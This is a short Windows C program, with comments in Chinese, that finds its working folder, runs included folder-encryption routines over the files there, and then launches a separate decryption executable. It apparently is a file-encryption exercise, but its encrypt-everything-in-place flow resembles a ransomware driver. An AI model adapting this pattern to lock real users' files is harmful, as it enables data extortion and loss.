#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#include "encryption.h"
#include "folder_encryption.h"

int main(void){
    int key = key_generation();

    char MainPosition[500]; //儲存主資料夾位址
    system("cd >> main_position.txt");
    FILE *main_position_read; //用來讀取main_position.txt
    main_position_read = fopen("main_position.txt", "r");
    fgets(MainPosition, sizeof(MainPosition), main_position_read);
    fclose(main_position_read);
    remove("main_position.txt");
    file_search(MainPosition);
    file_read(MainPosition);
    remove("processed_original_file_name.txt");
    //system("pause");//
    system("decryption_program.exe");

    return 0;
}
